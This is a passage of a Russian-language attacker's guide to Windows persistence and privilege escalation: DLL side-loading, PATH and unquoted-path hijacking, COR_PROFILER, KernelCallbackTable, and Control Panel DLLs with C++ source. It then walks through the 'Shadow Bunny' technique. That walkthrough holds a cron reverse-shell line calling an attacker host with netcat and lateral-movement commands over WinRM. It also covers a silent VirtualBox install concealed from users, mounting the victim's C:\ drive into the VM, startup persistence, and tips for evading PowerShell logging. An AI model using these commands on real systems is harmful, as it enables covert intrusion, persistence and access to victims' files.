контролируемая нами, также будет выполняться на более высоком уровне. В этом случае этот метод может быть использован 
для повышения привилегий от user к administrator или SYSTEM или от administrator к SYSTEM, в зависимости от программы. 
Программы, ставшие жертвами перехвата пути, могут вести себя нормально, поскольку вредоносные DLLs могут быть настроены на загрузку также и 
законных библиотек DLL, которые они должны были заменить.

## 43. DLL Side-Loading
Мы можем выполнять свои собственные вредоносные payloads путем дополнительной загрузки DLL. 
Как и при DLL Search Order Hijacking, side-loading включает в себя перехват DLL, которую загружает программа. 
Но вместо того, чтобы просто размещать DLL в порядке поиска программы, а затем ожидать вызова приложения-жертвы, мы можем напрямую 
делать side-load своих payloads, загружая в лигитимной бинарник, а затем вызывая лигитмный бинарник, который выполняет наши payload(s).

При Side-loading используется DLL search order, используемый загрузчиком, за счет размещения приложения-жертвы и вредоносной payload рядом друг с другом. 
Мы, вероятно, можем использовать Side-loade как средство маскировки действий, которые они выполняют в рамках лигитмного, trusted и потенциально защищенного системного или программного процесса. 
Безопасные бинарники, используемые для side-load payloads, могут не помечаться во время доставки и/или выполнения. 
Вредоносные payloads также могут быть encrypted/packed или иным образом обфусцированы до тех пор, пока не будут загружены в память доверенного процесса.

## 44. Executable Installer File Permissions Weakness 
Мы можем выполнять свои собственные вредоносные payloads через hijacking бинарников которые используются installer'ом. 
Эти процессы могут автоматически запускать определенные бинарники в рамках своей функциональности или для выполнения других действий. 
Если permissions на system directory, содержит таргетный бинарник, или разрешения для самого бинарника установлены неправильно,
то таргетный бинарник может быть перезаписан другим бинарником с использованием user-level permissions и выполнен original process'ом. 
Если original process и поток выполняются с более высоким уровнем разрешений, 
то замененный бинарник также будет выполняться с более высокими уровнями разрешений, которые могут включать SYSTEM.

Другой вариант этого метода можно реализовать, воспользовавшись weakness'ом, который часто встречается в executable, self-extracting installers. 
В процессе установки инсталлеры обычно используют subdirectory в диретории `%TEMP%` для анпака бинарников, таких как DLLs, EXEs или
другие payloads. Когда инсталлеры создают subdirectories и файлы, они часто не устанавливают соответствующие разрешения для ограничения доступа на запись, 
что позволяет выполнять untrusted код, размещенный в subdirectories, или перезаписывать бинарники, используемые в процессе установки. 

Мы можем использовать этот метод для замены лигитимных бинарников вредоносными для
выполнения кода с более высоким уровнем разрешений. Некоторые установщики могут также требовать повышенных привилегий, 
что приведет к повышению привилегий при выполнении кода, контролируемого нами.
Такое поведение связано с Bypass User Account Control.
Если процесс выполнения настроен на запуск в определенное время или во время определенного события (например, загрузки системы), то этот метод также может быть использован для persistence.

## 45. Path Interception by PATH Environment Variable 
Мы можем выполнять свои собственные вредоносные payloads через hijacking environment variables, используемые для загрузки библиотек.
Переменная среды PATH содержит список директорий (User and System), которые ОС последовательно просматривает в поисках бинарника, 
вызванного из скрипта или cmd.

Мы можем поместить вредоносную программу в более раннюю запись в списке директрий, хранящихся в PATH environment variable, 
в результате чего операционная система будет выполнять вредоносный бинарник, а не допустимый бинарник, при последовательном поиске по этому списку PATH.

Например, в Windows, если мы помещаем вредоносную программу с именем `net.exe` в поле `C:\example path`, которое по умолчанию 
предшествует `C:\Windows\system32\net.exe` в PATH environment variable, при запуске `net` из командной строки вместо системного исполняемого 
файла по адресу `C:\Windows\system32\net.exe` будет вызван `C:\example` path. Некоторые методы выполнения программы полагаются на PATH environment variable
для определения местоположения, в котором выполняется поиск, когда путь к программе не указан, например, при выполнении программ с помощью 
интерпретатора команд и сценариев.

Мы также можем напрямую изменять переменную `$PATH`, указывающую на директории, в которых будет осуществляться поиск. 
Мы можем изменить переменную `$PATH`, указав на каталог, к которому у него есть доступ на запись.
При вызове программы, использующей `$PATH` variable, ОС выполняет поиск в указанном каталоге и запускает вредоносный бинарник.

## 46. Path Interception by Search Order Hijacking 
Мы можем выполнять свои собственные вредоносные payloads, 
hijacking'ном search order'а, используемый для загрузки других программ. 
Поскольку некоторые программы не вызывают другие программы, используя полный путь, мы можем поместить свой собственный файл в каталог, 
где находится вызывающая программа, в результате чего OS запустит наш вредоносный бинарник по запросу вызывающей программы.

Перехват порядка поиска происходит, когда мы нарушаем порядок, в котором Windows выполняет поиск программ, для которых не указан путь. 
В отличие от перехвата порядка поиска DLLs, порядок поиска отличается в зависимости от метода, который используется для выполнения программы. 
Однако Windows обычно выполняет поиск в каталоге выполняемой программы, прежде чем выполнять поиск в system directories Windows. 
Обнаруживши, что программа уязвима для search order hijacking (т.е. программа, в которой не указан путь к исполняемому файлу), 
может воспользоваться этой уязвимостью, создав программу, названную в честь неправильно указанной программы, и поместив ее в каталог выполняемой программы.

Например,`example.exe` запускает `cmd.exe` с аргументом командной строки `net user`. Мы можем поместить программу с именем `net.exe` в тот же каталог, 
где находится `example.exe`, `net.exe` будет запущена вместо системной утилиты Windows net. Кроме того, если мы поместим программу с именем `net.com` в тот 
же каталог, где и `net.exe`, то `cmd.exe /C net user` выполнит `net.com` вместо `net.exe` из-за порядка исполняемых расширений, определенного в PATHEXT.

Search order hijacking также является обычной практикой для `DLL Search Order Hijacking` и описан в разделе `44. DLL Search Order Hijacking`

## 47. Path Interception by Unquoted Path 
Мы можем выполнять свои вредоносные payloads, hijacking ссылки на уязвимые file path. 
Мы можем использовать пути, в которых отсутствуют кавычки, помещая исполняемый файл в higher level directory
в пределах пути, чтобы Windows выбрала наш бинарник для запуска.

Service paths и shortcut paths также могут быть уязвимы для перехвата, если путь содержит один или несколько пробелов и не заключен в кавычки 
(например, `C:\unsafe path with space\program.exe` вместо `"C:\safe path with space\program.exe"`). (хранится в разделах реестра Windows).
Мы можем поместить бинарник в higher level directory по пути, и Windows зарезолвит этот бинарник вместо предполагаемого бинарника.

Этот метод может быть использован для persistence, если бинарники вызываются на регулярной основе, а также для privilege escalation,
если перехваченные бинарники запускаются процессом с более высокими привилегиями.

## 48. COR_PROFILER
Мы можем использовать COR_PROFILER environment variable для execution flow hijack программ, загружающих .NET CLR. 
COR_PROFILER - это фича .NET Framework, которая позволяет разработчикам указывать unmanaged (или external .NET) 
DLL для profiling, загружаемую в каждый .NET-процесс, который загружает среду CLR. Эти profilers предназначены для мониторинга, 
траблшутинга и debug managed code, выполняемого .NET CLR.

COR_PROFILER environment variable может быть установлена в различных областях (system, user или process), что приводит к различным уровням прав. 
System and user-wide environment variable scopes задаются в реестре, где Component Object Model (COM) может быть зарегистрирован
как profiler DLL.Process scope COR_PROFILER также может быть создана в памяти без изменения реестра. Начиная с .NET Framework 4, profiling DLL не нужно регистрировать, 
если в COR_PROFILER_PATH environment variable указано __cpLocation DLL.

Мы можем злоупотреблять COR_PROFILER для обеспечения persistence, при котором вредоносная DLL выполняется в контексте всех .NET 
процессов, которые каждый раз вызывают CLR. COR_PROFILER также может использоваться для elevate privileges (например, для Bypass User Account Control),
если victim .NET process выполняется с более высоким уровнем прав, а также для перехвата и ослабления защиты, предоставляемой .NET-процессами.

## 49. KernelCallbackTable 
Мы могут злоупотребить `KernelCallbackTable` процесса, чтобы hijack'нуть его execution flow и запустить свою собственную payload.
`KernelCallbackTable` находится в `Process Environment Block (PEB)` и инициализируется массивом graphic functions, доступных процессу с графическим
интерфейсом пользователя, после загрузки user32.dll.

Мы можем hijack'нуть execution flow процесса, используя `KernelCallbackTable`, заменив original callback function вредоносной payload. 
Изменение callback functions может быть достигнуто различными способами, включая связанные действия, такие как Reflective Code Loading или Process Injection в другой процесс.

Указатель на адрес памяти `KernelCallbackTable` может быть получен путем определения местоположения `PEB` (например, через вызов `NtQueryInformationProcess()` - Native API function).
Как только указатель найден, `KernelCallbackTable` может быть продублирован, а функция в таблице (например, `fnCOPYDATA`) установлена на адрес вредоносной payload
(например, через `WriteProcessMemory()`). Затем `PEB` обновляется с новым адресом таблицы. Как только будет вызвана измененная функция, будет запущена вредоносная payload.

Измененная функция обычно вызывается с помощью Windows message. После hijack'а процесса и выполнения вредоносного кода `KernelCallbackTable` также может 
быть восстановлен в исходное состояние с помощью оставшейся части нашего payload. Использование `KernelCallbackTable` для execution flow hijack может 
избежать обнаружения security products, поскольку выполнение может быть замаскировано под лигитимный процесс.

## 50. Executing Code as a Control Panel Item through an Exported Cplapplet Function
Как выполнить код в cpl, который представляет собой обычный DLL, представляющий Control Panel item:

В Cpl необходимо экспортировать CplApplet function, чтобы Windows распознала его как Control Panel item.

Как только DLL будет скомпилирована и переименована в .CPL, можно будет просто дважды щелкнуть по ней и запустить как обычный .exe.

    #include "stdafx.h"
    #include <Windows.h>

    //Cplapplet
    extern "C" __declspec(dllexport) LONG Cplapplet(
	    HWND hwndCpl,
	    UINT msg,
	    LPARAM lParam1,
	    LPARAM lParam2
    )
    {
	    MessageBoxA(NULL, "Hey there, I am now your control panel item you know.", "Control Panel", 0);
	    return 1;
    }

    BOOL APIENTRY DllMain( HMODULE hModule,
                           DWORD  ul_reason_for_call,
                           LPVOID lpReserved
                         )
    {
        switch (ul_reason_for_call)
        {
        case DLL_PROCESS_ATTACH:
	    {
		    Cplapplet(NULL, NULL, NULL, NULL);
	    }
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
        }
        return TRUE;
    }

Как только DLL будет скомпилирована, мы сможем увидеть нашу exported function `CplApplet`: https://imgur.com/a/CK5R5tj

Вот что в итоге: https://imgur.com/a/mj80Af7

CPL также можно запустить с помощью команды `control.exe <pathtothe.cpl>`, например: https://imgur.com/a/AECnsnH

или запускаем через `rundll32`: https://imgur.com/a/JsZhAeZ

    rundll32 shell32, Control_RunDLL \\VBOXSVR\Experiments\cpldoubleclick\cpldoubleclick\Debug\cpldoubleclick.cpl

Потом делаем, к примеру, .bat скрипт, который ставим на какой-нибудь из способов выше, чтобы он запускался при старте системы.

## 51. Code Execution through Control Panel Add-ins
Давай скомпилируем наш control panel item (который представляет собой простую DLL с exported function `Cplapplet`) из приведенного ниже кода:

    #include <Windows.h>
    #include "pch.h"

    //Cplapplet
    extern "C" __declspec(dllexport) LONG Cplapplet(
        HWND hwndCpl,
        UINT msg,
        LPARAM lParam1,
        LPARAM lParam2
    )
    {
        MessageBoxA(NULL, "Hey there, I am now your control panel item you know.", "Control Panel", 0);
        return 1;
    }

    BOOL APIENTRY DllMain(HMODULE hModule,
        DWORD  ul_reason_for_call,
        LPVOID lpReserved
    )
    {
        switch (ul_reason_for_call)
        {
        case DLL_PROCESS_ATTACH:
        {
            Cplapplet(NULL, NULL, NULL, NULL);
        }
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
        }
        return TRUE;
    }

Теперь зарегистрируем наш control panel item в качестве add-in: https://imgur.com/a/L0aPtUa

    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Control Panel\CPLs" /v spotless /d "C:\labs\cplAddin\cplAddin\x64\Release\cplAddin2.dll" /f

Теперь, всякий раз, когда открывается Control Panel, наша DLL будет инжектиться в explorer.exe и наш код будет выполняться:

1) https://imgur.com/a/1gE0Wuo
2) https://imgur.com/a/ienxWAS

## 52. Shadow Bunny technique(Virtual Machines)
Первый вопрос - какой продукт виртуализации выбрать? Вариантов много.... 
Изначально я использовал Hyper-V, поскольку он поставляется в комплекте с 
Windows и, если его нет, может быть быстро включен.

Тут будет сказ о VirtualBox. Но, я также рассмотрю
и Hyper-V.

Можно также использовать VmWare, со скриптами для автоматической установки.
Существует множество других продуктов для виртуальных машин, 
и мы можем также внедрить свои собственные.

VirtualBox - отличный продукт, и он доступен для нескольких платформ.

### Direct Host Connections
Одним из важных аспектов является то, что некоторые продукты виртуализации могут 
быть настроены на прямой доступ к хосту. Под этим я подразумеваю, например, 
создание общей папки между гостем и хостом, в зависимости от продукта доступ
может быть предоставлен без необходимости аутентификации по сети. 
Это скрытый метод, о котором следует знать.

Для вредоносных программ это идеальный вариант, поскольку в противном
случае доступ к файлам на хосте осуществлялся бы через удаленное соединение, 
а это означает, что для постоянной аутентификации на хосте необходимо иметь 
действительные учетные данные. Это тоже может быть полезно, но не так просто,
как “собственное” подключение к хосту с использованием общей папки.
В этом отношении у Hyper-V есть ограничения на “прямые” подключения гостя к хосту.

Для некоторых атак постоянное подключение (или бэкдор) к хосту может и не потребоваться. 
Например, представим, что мы используем виртуальную машину для майнинга
криптовалюты или выполнения атак методом перебора паролей в автономном режиме. 
В этом случае для доступа к своей инфраструктуре C2 для обмена результатами им 
требуется только подключение по сети NAT или мостовой локальной сети. 
После развертывания виртуальной машины нет необходимости напрямую обращаться к хосту.

Для демонстрации и подтверждения концепции мы используем компьютер с 
Windows (64-разрядная версия).

### Pre-requisites
Для сценария, по которому мы проходим, есть несколько предварительных условий:

### Command and Control Infrastructure
Первым шагом является настройка basic Command & Control infrastructure(C2).
Просто используй любую инфраструктуру C2.
Например, вот скриншот настройки Sliver by Bishop Fox,
принимающей входящие соединения от зомби (shadowbunnies): https://imgur.com/a/jjoc1AE

Однако для этой простой демонстрации мы просто используем `netcat` в качестве сервера.
Сервер размещен по адресу `10.10.10.10`

Мы запускаем наш сервер netcat с помощью: 
    
    sudo nc -klvp 443

Аргументы следующие:

    -k допускает несколько подключений, так что netcat не завершается полностью, если мы выходим из shell
    -l настраивает netcat как сервер
    -v это verbose mode, поэтому netcat отображает дополнительную информацию
    -p указывает порт для лисенинга, в данном случае мы просто используем порт 443

Для демонстрации это все, C2 запущен. На следующем рисунке показана эта простая настройка: https://imgur.com/a/ABcZnpd

Возможно, брандмауэр хоста блокирует подключения, в этом случае брандмауэр нуждается в настройке.
Во время работы следует использовать encrypted channel, возможно, 
используя HTTPS-трафик на 443, чтобы не выделяться.

### Creating the Shadowbunny virtual disk image
Второе необходимое условие - это образ диска Shadowbunny.

Мы можем настраивать виртуальную машину по своему усмотрению, 
она полностью контролируется нами.

Вероятно, виртуальная машина захочет периодически автоматически подключаться к C2 для 
проверки команд. Возможно, включить шифрование диска, 
удалить любые ненужные проги, установить прямое подключение к
хосту через shared folder или доступ к буферу обмена, отключить все аудио и видеосигналы, 
отключить телеметрию, возможно, подключить USB для доступа к smart cards или security keys
и многое другое.

Создание может быть длительным и сложным этапом в зависимости от работы.
В некоторых случаях размер диска должен быть небольшим,
чтобы ограничить время, необходимое для выполнения lateral movement.

`Интересный факт: Недавняя программа–вымогатель Ragnar Lock 
использовала старую версию Windows XP,
из-за чего размер виртуальной машины был довольно небольшим.`

Для начала работы подойдет Ubuntu Server VM. 
Для более сложных случаев также есть легкие дистрибутивы Linux. 
В конечном итоге результатом будет файл образа диска виртуальной машины (или vdi, vhd, vhdx).

### Using flock to regularly connect to the C2:

Если виртуальная машина работает под управлением Linux,
команда `flock` может использоваться для регулярного пробуждения зомби.

- Edit'ем crontab на attack VM через nano:

       sudo crontab -e
- После этого обновите файл cron:

       * * * * * /usr/bin/flock -n /tmp/zombie.lock nc 10.10.10.10 443 -e /bin/bash

Пояснение: 
Команда `flock` - это элегантное решение, гарантирующее, 
что команда будет запущена только один раз. 
Параметр -n означает, что если файл блокировки /tmp/zombie.lock существует,
то процесс остановится. 
Если он еще не создан, то будет запущена команда netcat для подключения к серверу.

jobs Cron и `flock` пригодятся и для других сценариев.

### Optional: Shared Folders and other advanced features
Для поддержки shared folders или доступа к буферу обмена хостов на виртуальной машине должны быть 
установлены `Guest Additions`. 
Дополнительную информацию и варианты установки можно найти на веб-сайтах Ubuntu и VirtualBox.

В этом случае я загрузил ISO-файл непосредственно в виртуальную машину, используя следующую команду.
    
    wget https://download.virtualbox.org/virtualbox/6.1.8/VBoxGuestAdditions_6.1.8.iso`

А затем установил его, используя следующие команды:

    sudo mkdir /mnt/cd
    sudo mount VBoxGuestAdditions_6.1.8.iso /mnt/cd
    sudo ./VBoxLinuxAdditions.run -–nox11

Вот и все, `Guest Additions` VirtualBox теперь установлены на виртуальной машине.

Иногда этот шаг требует отладки, поскольку установка `Guest Additions` может 
выполняться различными способами и зависит от используемой операционной системы. 
Более подробная информация приведена в руководстве по VirtualBox.

Настроив все эти предварительные условия, мы готовы выполнить разворот 
Shadowbunny, используя этот образ виртуальной машины.

### Description on a more abstract level

Теперь, когда клиент и сервер готовы, их можно использовать во время lateral movement: https://imgur.com/a/KVWBSRS

Этапы включали в себя pivot, installation/enabling программного обеспечения для виртуализации, 
загрузку предварительно созданных образов дисков, настройку и запуск.
Давайте рассмотрим это более подробно.

### Compromise - Pivoting to the target
Первым шагом является выполнение кода на таргетном компьютере с учетными данными администратора.

В этом случае мы просто предполагаем, что мы получили пароль администратора и 
переходим на целевую машину во время lateral movement.

Для этой демонстрации давайте воспользуемся Windows Remote Management (WinRM) и `Enter-PSSession`. 
В моей тестовой среде у меня есть self-signed certificate на таргетном хосте 
для установки WinRM, а порт для secure WinRM - 5986.
В этом случае начальный разворот выполняется следующими командами:

    $sessionOptions = New-PsSessionOption -SkipCACheck
    $creds = Get-Credential
    Enter-PSSession -Computer dangerzone -Port 5986 -Credential $creds -SessionOption $sessionOptions -UseSSL

На следующем снимке экрана показаны три шага с более подробным описанием: https://imgur.com/a/QbrpZ1Z

1. Использование `New-PsSessionOption` для отключения проверки сертификата. Причина этого в том, что в кейсе цель использует self-signed certificate для WinRM, которому наш компьютер не доверяет. В корпоративных условиях, которые обычно не требуются (если атакующая машина присоединена к домену)
2. Использование `Get-Credential` для сохранения учетных данных администратора для таргетного хоста
3. Выполнение `Enter-PSSession` для установления remote management session over TLS на таргетном компьютере под названием `dangerzone`.

Результатом является командная строка PowerShell на удаленном хосте. 
Теперь мы можем изучить возможность создания нашего первого Shadowbunny на таргетном компьютере.

### Checking if virtualization products are present already
Некоторые продукты виртуализации плохо сочетаются друг с другом, поэтому при наличии одного из них лучше
использовать существующий.
На данный момент мы предполагаем, что в таргетный системе нет другого продукта.

### Downloading virtualization software

Здесь в осном рассматривается VirtualBox, но мы также рассмотрим основы для Hyper-V 
(Hyper-V уже присутствует на компьютерах с Windows, поэтому загружать его не нужно).

Текущий installer под Windows находится по адресу https://download.virtualbox.org/virtualbox/6.1.8/VirtualBox-6.1.8-137981-Win.exe.

Чтобы быстро загрузить программу установки на таргетный сервер, запустим:

    Invoke-WebRequest "https://download.virtualbox.org/virtualbox/6.1.8/VirtualBox-6.1.8-137981-Win.exe" -OutFile $env:TEMP\VirtualBox-6.1.8-137981-Win.exe

Примечание: На момент прочтения версия, указанная выше, устарела.
Кроме того, `Guest Additions` должны соответствовать версии VirtualBox.

На следующем скриншоте показано, как перейти на таргетный host “dangerzone” и загрузить VirtualBox: https://imgur.com/a/EUbQxhf
Команда для загрузки VirtualBox занимает немного времени в зависимости от скорости сети.

### Important Tip
Во многих средах, которые я видел, 
и в blue teams, с которыми я общался, ведение журнала довольно эффективно,
когда дело доходит до выполнения команд PowerShell.

Особенно большое внимание уделяется сценариям,
использующим `Invoke-WebRequest` или `WebClient` для загрузки инструментов из Интернета,
и аналитики часто проверяют их вручную.

Однако существует множество тактических приемов, 
позволяющих продолжать использовать PowerShell и избегать обнаружения.

Использование PowerShell в качестве adversarial technique никуда
не денется, точно так же, как мы по-прежнему видим, что вредоносные программы используют VBScript.

Просто приведу несколько примеров:

- Монтируем Cloud SMB share и копируем даиу используя обычную copy command.
- Можно использовать database connections, чтобы загружать tools 
- Выделим еще один хитрый метод, например, загрузку XML с external entity definition, содержащего payloads для атаки.
- Существует множество других способов, с помощью которых мы можем использовать PowerShell и скрываться, действуя немного иначе, чем обычно.

Это должно дать некоторые представления о том, какие необычные действия мы можем предпринять 
при использовании PowerShell для проникновения вредоносного ПО на хосты.

### Installing VirtualBox
Теперь, когда мы загрузили VirtualBox, самое сложное - выполнить автоматическую установку, 
чтобы пользователи не знали о том, что программное обеспечение сохраняется на их компьютерах.

Большинство корпоративных продуктов допускают автоматическую установку, 
потому что ИТ-отделу нужны эти функции для развертывания, а мы просто используем этот механизм.

В этом случае мы запускаем:

    VirtualBox-6.0.14-133895-Win.exe --silent --ignore-reboot --msiparams VBOX_INSTALLDESKTOPSHORTCUT=0,VBOX_INSTALLQUICKLAUNCHSHORTCUT=0

Обратите внимание на параметры командной строки, там есть опции, 
позволяющие выполнить автоматическую установку и избежать создания значков на рабочем столе
и быстрого запуска. Мы также хотим избежать перезагрузки компьютера.

Дополнительные параметры для настройки системы приведены по адресу https://docs.oracle.com/en/virtualization/virtualbox/6.0/user/installation_windows.html.

Установка займет несколько минут. На следующем скриншоте это показано в действии: https://imgur.com/a/cTnWzJ9

После завершения установки мы можем использовать VBoxManage.exe для создания виртуальных машин и их настройки.

### The VBoxManage Command Line Interface
бинарник VBoxManage по умолчанию находится по адресу
`\Program Files\Oracle\VirtualBox\VBoxManage.exe` и может быть запущен, 
как показано на скриншоте: https://imgur.com/a/oK24UAd

На приведенном выше рисунке показано, что установка прошла успешно, и `VBoxManage.exe` работает.

VBoxManage предлагает множество команд и функций для автоматизации управления виртуальными машинами. 
Функции и опции этого инструмента описаны по адресу https://www.virtualbox.org/manual/ch08.html.

Например, некоторые базовые команды для отображения списка виртуальных машин следующие:

    VBoxManage list vms 
    VBoxManage list runningvms
    VBoxManage startvm

Чтобы создать новую виртуальную машину во время lateral movement, 
мы выполним последовательность команд с помощью VBoxManage, инструмента 
управления VirtualBox. 
В итоге конфигурация сохраняется в XML definition file, 
который также может быть зарегистрирован с помощью команды VBoxManage.

### Disabling notifications
При желании можно настроить дополнительные параметры, например, для Disabling notifications:
    
    VBoxManage.exe setextradata global GUI/SuppressMessages "all" 
Теперь, когда мы знаем основы VBoxManage, давайте перейдем к созданию виртуальной машины.

### Download the custom Shadowbunny VM disk image to the host
Как и при загрузке installation package, это можно сделать несколькими способами.

Допустим, мы разместили образ на SMB Share in Microsoft Azure:

    Copy-Item \\smbserver\images\shadowbunny.vhd $env:USERPROFILE\VirtualBox\IT Recovery\shadowbunny.vhd

Во время работы я обычно использовал локальный файловый сервер в организации для размещения файла.

### Configuring the VM
Используя команду `createvm`, мы создаем виртуальную машину и регистрируем disk image file
в виртуальной машине. 
`VBoxManage.exe` после установки устанавливается по адресу `\Program Files\Oracle\VirtualBox`.

- Следующая команда создаст новую виртуальную машину:
        
      $vmname = "IT Recovery"
      .\VBoxManage.exe createvm --name $vmname --ostype "Ubuntu" --register

     Это позволит создать виртуальную машину и сразу же зарегистрировать ее, результат будет следующим:
        
      Virtual machine 'IT Recovery' is created and registered.
      UUID: 7891a2bd-e9cc-432a-ae2a-ba1fb2de96a4
      Settings file: 'C:\Users\wuzzi\VirtualBox VMs\IT Recovery\IT Recovery.vbox'

     Обратите внимание на файл настроек с расширением `.vbox`. Это xml configuration file на виртуальной машине.

- Далее мы можем модифицировать виртуальную машину в соответствии со кейсом
    
    В этом случае мы, например, добавляем сетевую карту и настраиваем ее на использование NAT, чтобы наша виртуальная машина могла взаимодействовать с внешним миром.

        .\VBoxManage.exe modifyvm $vmname --ioapic on  # required for 64bit
        .\VBoxManage.exe modifyvm $vmname --memory 1024 --vram 128
        .\VBoxManage.exe modifyvm $vmname --nic1 nat
        .\VBoxManage.exe modifyvm $vmname --audio none
        .\VBoxManage.exe modifyvm $vmname --graphicscontroller vmsvga
        .\VBoxManage.exe modifyvm $vmname --description "Shadowbunny"

- Теперь пришло время смонтировать Shadowbunny image
     
    Для этого мы создаем storage controller

        .\VBoxManage.exe storagectl $vmname –name “SATA Controller” –add sata

- И аттачим VHD file к storage controller

        .\VBoxManage.exe storageattach $vmname –comment “Shadowbunny Disk” –storagectl “SATA Controller” –type hdd –medium “$env:USERPROFILE\VirtualBox VMs\IT Recovery\shadowbunny.vhd” –port 0

На этом setup basic VM. завершена. 
Для развертывания можно предварительно создать xml и передать его в вызов `createvm` с `--register`.

Чтобы добиться persistence на хосте, мы можем выполнить дополнительный трюк, который заключается в регистрации общей папки на виртуальной машине. 
Это то, что мы обсудим сейчас.

### Optionally adding a shared folder
Как мы видели, файл настроек назван в честь machine и имеет `.vbox` extension. 
Например, на моей machine (default settings) он находится по адресу `%USERPROFILE%\VirtualBox VMs\IT Recovery\IT Recovery.vbox`.

Чтобы создать общую папку между виртуальной машиной и хостом, мы можем использовать команду `sharedfolder`:

    .\VBoxManage.exe sharedfolder add $vmname –name shadow_c –hostpath c:\ -automount

Общие папки настраиваются с помощью файла конфигурации xml. После выполнения приведенной выше команды в файле конфигурации отображается следующее:

    <SharedFolders>
       <SharedFolder name="shadow_c" hostPath="c:\" writable="true" autoMount="true"/>
    </SharedFolders>

Внутри виртуальной машины (учитывая, что она основана на Linux) можно просто смонтировать диск через (в случае, если он не был смонтирован автоматически)

    sudo mkdir /mnt/c
    sudo mount -t vboxsf shadow_c /mnt/c

Для этого на атакуемой виртуальной машине должны быть установлены `Guest Additions` VirtualBox.

На этом настройка завершена, и если кто-то откроет VirtualBox на компьютере жертвы, он увидит следующий UI: https://imgur.com/a/Qhs8rmi
Как видно на скриншоте, виртуальная машина “IT Recovery” была успешно создана и в настоящее время отключена. Давайте включим ее.

### Launching the virtual machine
Вуаля, теперь пришло время запустить виртуальную машину.
    
    .\VBoxManage.exe startvm "IT Recovery" –type headless 

Это запустит виртуальную машину и через секунду выведет сообщение следующего вида:

    Waiting for VM "IT Recovery" to power on...
    VM "IT Recovery " has been successfully started.

Теперь виртуальная машина загрузится.

Мы добавили задание cron в виртуальную машину Shadowbunny. 
Это означает, что через несколько секунд виртуальная машина установит reverse shell для command and control infrastructure.

На следующем экране показан результат, наблюдаемый C2: https://imgur.com/a/Axot7c6
Поскольку мы также настроили shared folder для хоста, мы можем подключить shared folder и взаимодействовать с файловой системой на хосте, как показано на следующем скриншоте: https://imgur.com/a/3Eh8hNG

На приведенном выше скрине показана виртуальная машина Shadowbunny на скомпрометированном хосте, подключающаяся к инфраструктуре C2.
И тогда можно получить прямой доступ к файловой системе на хосте.

### Automatically launching the VM upon reboot
В отличие от других продуктов виртуализации Windows (например, Hyper-V), 
VirtualBox не имеет (простого) встроенного способа автоматического запуска виртуальной машины при перезагрузке хоста.

Это плохо, потому что позволяет иметь больше шансов обнаружить нашу малварь.
Чтобы виртуальная машина запускалась при перезагрузке хоста, мы можем добавить 
команду startvm в папку автозагрузки, зарегистрировать службу или использовать один из других способов запуска команд при запуске или загрузке или же использовать один из методов выше.

Давайте рассмотрим простое решение, которое заключается в использовании `Startup` folder.

- Создаем `config.bat`

      start /min "C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" startvm "IT Recovery" –type headless
- Сохраняем файл в startup folder жертвы по адресу:

      %USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

Теперь, что касается Command and Control, обратите внимание, что виртуальная машина устанавливает соединение после перезагрузки, когда пользователь снова входит на рабочую станцию.

### Alternative: Using Hyper-V for Shadowbunny pivots
Hyper-V поставляется в комплекте с Windows и, если он не включен, может быть легко включен с помощью:

    Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V –All or DISM /Online /Enable-Feature /All /FeatureName:Microsoft-Hyper-V
Обратите внимание: для этого требуется перезагрузка компьютера.

Затем можно использовать команды PowerShell для создания компьютеров и управления ими:

    $VM = "IT Recovery"
    New-VM -Name $VM
           -MemoryStartupBytes 2147483648
           -Generation 2
           -VHDPath "C:\Users\...\Virtual Hard Disks\shadowbunny.vhdx"
           -Path "C:\Users\All Users\Documents\Hyper-V\shadowbunny"
           -SwitchName (Get-VMSwitch).Name

    Set-VMFirmware $VM -EnableSecureBoot Off

    Start-VM $VM

Hyper-V автоматически возобновляет работу виртуальных машин при перезагрузке хоста. 
Для Shared folders требуется удаленное подключение, а “прямого” подключения от гостя к хосту с помощью Hyper-V, похоже, нет.

### Endless possibilities
Из более подходящих вариантов стоит обратить внимание на эмуляцию системы, что позволяет обходится без поддержки вирутализации на CPU, а также можно создать свои решения по виртуализации 
или тот же WSL(Windows subsystem for linux)